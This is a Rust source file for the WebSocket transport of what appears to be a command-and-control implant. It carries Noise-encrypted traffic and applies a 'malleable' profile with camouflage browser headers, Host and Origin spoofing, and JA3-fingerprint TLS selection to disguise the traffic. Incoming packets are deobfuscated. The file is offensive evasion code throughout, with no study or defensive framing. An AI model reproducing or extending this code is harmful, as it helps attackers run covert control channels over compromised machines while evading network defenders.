// WebSocket transport — Noise session key traffic, malleable profile headers, fragmentation.

use crate::backoff::ExponentialBackoff;
use crate::config::{get_aes_key, get_aes_key_base};
use crate::crypto;
use crate::error::{ClientError, Result};
use crate::transport::traffic_crypto::{seal_for_wire, traffic_key, FragReassembler, OpenResult};
use crate::transport::Transport;
use async_trait::async_trait;
use futures_util::{SinkExt, StreamExt};
use log::{debug, error, info};
use tokio::net::TcpStream;
use tokio::time::sleep;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{connect_async, MaybeTlsStream, WebSocketStream};

pub type WsStream = WebSocketStream<MaybeTlsStream<TcpStream>>;

pub struct WebSocketTransport {
    url: String,
    stream: Option<WsStream>,
    backoff: ExponentialBackoff,
    /// Static AES (salt-derived) — only for pre-Noise fallback when no PSK/base key
    aes_key: Vec<u8>,
    /// Base PSK for Noise (must match server resolveAESKey — NO salt KDF)
    noise_psk: Vec<u8>,
    /// Post-handshake session key (required for all subsequent traffic when encryption on)
    noise_session_key: Option<[u8; 32]>,
    reassembler: FragReassembler,
}

impl WebSocketTransport {
    pub fn new(url: String) -> Self {
        let cleaned_url = url
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim()
            .to_string();

        let noise_psk = get_aes_key_base();
        let aes_key = get_aes_key();
        debug!(
            "WebSocketTransport url={} psk_base={} aes_derived={}",
            cleaned_url,
            noise_psk.len(),
            aes_key.len()
        );

        Self {
            url: cleaned_url,
            stream: None,
            backoff: ExponentialBackoff::new(),
            aes_key,
            noise_psk,
            noise_session_key: None,
            reassembler: FragReassembler::new(),
        }
    }

    pub fn url(&self) -> &str {
        &self.url
    }

    fn session_key_bytes(&self) -> Result<&[u8]> {
        traffic_key(self.noise_session_key.as_ref(), &self.aes_key)
    }
}

#[async_trait]
impl Transport for WebSocketTransport {
    async fn connect(&mut self) -> Result<()> {
        // Bounded retries so outer fallback / backoff can run (was infinite loop).
        const MAX_ATTEMPTS: u32 = 5;
        let mut attempts = 0u32;

        loop {
            attempts += 1;
            debug!(
                "Connecting to {}... (attempt {}/{})",
                self.url, attempts, MAX_ATTEMPTS
            );
            self.noise_session_key = None;
            self.reassembler.clear();

            let profile =
                crate::transport::profile::get_profile(&crate::config::get_profile_name());

            // Path/query from malleable uri_template (scheme+host from configured URL)
            let connect_url = crate::transport::profile::url_with_profile_path(&self.url, &profile);
            debug!(
                "profile={} connect_url={} ja3_hint={}",
                profile.name,
                connect_url,
                crate::transport::profile::get_ja3_hint(&profile)
            );

            // Build request then apply malleable profile via shared helper.
            // IntoClientRequest generates the standard WS handshake headers
            // (Sec-WebSocket-Key/Upgrade/Connection/Sec-WebSocket-Version),
            // which tungstenite requires when a Request is passed to connect_async.
            use tokio_tungstenite::tungstenite::client::IntoClientRequest;
            let mut req = connect_url
                .as_str()
                .into_client_request()
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;

            crate::transport::profile::apply_profile_headers(&profile, &mut req);

            // WebSocket / TLS camouflage extras (on top of profile)
            {
                let headers = req.headers_mut();
                if self.url.starts_with("wss://") {
                    let (dest, mode, site) = crate::transport::profile::pick_sec_fetch();
                    if let Ok(v) = dest.parse() {
                        headers.insert("sec-fetch-dest", v);
                    }
                    if let Ok(v) = mode.parse() {
                        headers.insert("sec-fetch-mode", v);
                    }
                    if let Ok(v) = site.parse() {
                        headers.insert("sec-fetch-site", v);
                    }
                    if let Some(host) = crate::config::get_host_header() {
                        let origin = format!("https://{}", host.split(':').next().unwrap_or(&host));
                        if let Ok(v) = origin.parse() {
                            headers.insert(tokio_tungstenite::tungstenite::http::header::ORIGIN, v);
                        }
                    }
                }
                if let Some(host) = crate::config::get_host_header() {
                    if let Ok(v) = host.parse() {
                        headers.insert(tokio_tungstenite::tungstenite::http::header::HOST, v);
                    }
                }
            }

            let is_tls = connect_url.starts_with("wss://");
            let ja3_hint = crate::transport::profile::get_ja3_hint(&profile);
            // M-007: with feature `ws-tls`, use rustls + cipher order from ja3_hint.
            // Without ws-tls, fall back to default connector (platform TLS / default rustls).
            let connect_result = {
                #[cfg(feature = "ws-tls")]
                {
                    if is_tls {
                        use tokio_tungstenite::connect_async_tls_with_config;
                        match crate::transport::tls_ja3::connector_for_ja3_hint(ja3_hint) {
                            Ok(connector) => {
                                connect_async_tls_with_config(req, None, false, Some(connector))
                                    .await
                            }
                            Err(e) => {
                                debug!(
                                    "tls_ja3 connector failed ({e}), falling back to connect_async"
                                );
                                connect_async(req).await
                            }
                        }
                    } else {
                        connect_async(req).await
                    }
                }
                #[cfg(not(feature = "ws-tls"))]
                {
                    let _ = ja3_hint;
                    // Platform default — enable feature `ws-tls` for rustls cipher control
                    connect_async(req).await
                }
            };

            match connect_result {
                Ok((ws_stream, response)) => {
                    info!(
                        "Connected status={} tls={} profile={}",
                        response.status(),
                        is_tls,
                        profile.name
                    );
                    self.stream = Some(ws_stream);
                    self.backoff.reset();

                    // Noise X25519 handshake with BASE key as PSK (server-aligned).
                    // A missing PSK is a hard failure: production never continues
                    // without an authenticated session key.
                    if self.noise_psk.is_empty() {
                        return Err(ClientError::ConnectionError(
                            "Noise PSK missing — refusing to establish unauthenticated session".into(),
                        ));
                    }
                    {
                        let (ephemeral_key, handshake_msg) =
                            crypto::noise_initiate(&self.noise_psk).map_err(|e| {
                                ClientError::ConnectionError(format!("Noise init: {e}"))
                            })?;

                        let stream = self.stream.as_mut().ok_or_else(|| {
                            ClientError::ConnectionError("ws stream missing".into())
                        })?;
                        stream
                            .send(Message::Binary(handshake_msg))
                            .await
                            .map_err(|e| {
                                ClientError::ConnectionError(format!("Noise send: {e}"))
                            })?;

                        let server_response = match stream.next().await {
                            Some(Ok(Message::Binary(data)))
                                if data.len() == crypto::NOISE_MSG_LEN =>
                            {
                                data
                            }
                            Some(Ok(Message::Binary(data))) => {
                                return Err(ClientError::ConnectionError(format!(
                                    "Noise resp len {} want {}",
                                    data.len(),
                                    crypto::NOISE_MSG_LEN
                                )));
                            }
                            Some(Ok(other)) => {
                                return Err(ClientError::ConnectionError(format!(
                                    "unexpected during Noise: {:?}",
                                    other
                                )));
                            }
                            Some(Err(e)) => {
                                return Err(ClientError::ConnectionError(format!(
                                    "Noise recv: {e}"
                                )));
                            }
                            None => {
                                return Err(ClientError::ConnectionError(
                                    "closed during Noise".into(),
                                ));
                            }
                        };

                        let session_key = crypto::noise_complete(
                            &ephemeral_key,
                            &server_response,
                            &self.noise_psk,
                        )
                        .map_err(|e| {
                            ClientError::ConnectionError(format!("Noise complete: {e}"))
                        })?;
                        self.noise_session_key = Some(session_key);
                        info!("Noise session key established — all traffic uses session key");
                    }

                    return Ok(());
                }
                Err(e) => {
                    if attempts >= MAX_ATTEMPTS {
                        return Err(ClientError::ConnectionError(format!(
                            "ws connect failed after {} attempts: {}",
                            MAX_ATTEMPTS, e
                        )));
                    }
                    let delay = self.backoff.next_delay();
                    debug!(
                        "connect failed {}: {}, retry in {}s ({}/{})",
                        self.url,
                        e,
                        delay.as_secs(),
                        attempts,
                        MAX_ATTEMPTS
                    );
                    sleep(delay).await;
                }
            }
        }
    }

    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let key = {
            let k = self.session_key_bytes()?;
            k.to_vec()
        };
        // Prefer session key: if Noise ran, noise_session_key is Some and used exclusively
        if self.noise_session_key.is_some() {
            debug!("send {} bytes with Noise session key", data.len());
        } else {
            debug!("send {} bytes with static AES (no Noise)", data.len());
        }

        let frames = seal_for_wire(data, &key, 0)?;
        let stream = self
            .stream
            .as_mut()
            .ok_or_else(|| ClientError::ConnectionError("Not connected".into()))?;

        for frame in frames {
            stream
                .send(Message::Binary(frame))
                .await
                .map_err(|e| ClientError::ConnectionError(format!("WS send: {e}")))?;
        }
        Ok(())
    }

    async fn receive(&mut self) -> Result<Vec<u8>> {
        let key = {
            let k = self.session_key_bytes()?;
            k.to_vec()
        };

        loop {
            let stream = self
                .stream
                .as_mut()
                .ok_or_else(|| ClientError::ConnectionError("Not connected".into()))?;

            match stream.next().await {
                Some(Ok(Message::Binary(raw))) => {
                    let deobf = crypto::deobfuscate_packet(raw);
                    match self.reassembler.push(deobf, &key)? {
                        OpenResult::Complete(pt) => return Ok(pt),
                        OpenResult::NeedMore => continue,
                    }
                }
                Some(Ok(Message::Text(t))) => {
                    let deobf = crypto::deobfuscate_packet(t.into_bytes());
                    match self.reassembler.push(deobf, &key)? {
                        OpenResult::Complete(pt) => return Ok(pt),
                        OpenResult::NeedMore => continue,
                    }
                }
                Some(Ok(Message::Ping(p))) => {
                    let _ = stream.send(Message::Pong(p)).await;
                    continue;
                }
                Some(Ok(Message::Pong(_))) | Some(Ok(Message::Frame(_))) => continue,
                Some(Ok(Message::Close(_))) | None => return Ok(Vec::new()),
                Some(Err(e)) => {
                    error!("WS receive error: {}", e);
                    return Err(ClientError::ConnectionError(format!("WS recv: {e}")));
                }
            }
        }
    }

    fn is_connected(&self) -> bool {
        self.stream.is_some()
    }
}

fn warn_no_psk() {
    log::warn!("No AES base key — connection refused (production requires authenticated transport)");
}
